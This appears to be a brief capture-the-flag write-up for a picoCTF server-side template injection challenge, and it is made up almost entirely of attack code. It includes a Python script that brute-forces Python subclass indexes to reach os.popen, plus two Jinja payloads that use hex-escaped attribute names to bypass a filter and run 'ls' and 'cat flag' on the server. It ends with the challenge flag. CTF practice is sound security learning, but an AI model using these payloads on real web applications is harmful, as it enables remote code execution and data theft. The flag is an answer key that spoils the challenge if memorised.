curl -I http://shape-facility.picoctf.net:59746/announce

<img width="570" height="88" alt="Screenshot 2025-08-17 at 10 25 59 PM" src="https://github.com/user-attachments/assets/7a865d9f-eefc-4a9d-bcd4-20a8b5ff69b0" />

'''
# Script to craft payload


import requests
import html
import re

url = "ctf-url"
#This payload returns a list of all subclasses of the base Python #object class.
payload = "{{\"\".__class__.__base__.__subclasses__()}}"

#We send the payload to the vulnerable endpoint via a POST request.
r = requests.post(url, data={"content":payload})

#If the request is successful, we decode the HTML content and extract class names using regex.

if r.status_code == 200:
    html_content = r.text
    content_decoded = html.unescape(html_content)
    class_names = re.findall(r"<class '([^']+)'>", content_decoded)
    print(len(class_names))

    #For each subclass index, we craft a new payload to try to access __globals__['sys'] and run a shell command: cat flag.
    for i in range(0, len(class_names)):
        new_paload = "{{\"\".__class__.__base__.__subclasses__()["+ str(i) + "].__init__.__globals__['sys'].modules['os'].popen('cat flag').read()}}"
        #We send the new payload to the server.
         nr = requests.post(url, data={"content":new_paload})
         #If the response contains the flag, we print the result and stop the script.
        if nr.status_code == 200:
            print(nr.text)
            print("*"*20)
            #This is how we find the first subclass that gives us working access to Python internals, in this case: index 80.
            print("class name: ", class_names[i], "index: ", i)
            exit(0)


try to print all of directories

'''
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls')|attr('read')()}}


<img width="1011" height="738" alt="Screenshot 2025-08-17 at 10 38 24 PM" src="https://github.com/user-attachments/assets/fa27a38b-ab5c-4f96-94c6-a6d130ac1711" />

attempt to open flag

'''
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}


picoCTF{sst1_f1lt3r_byp4ss_060a5eb0}



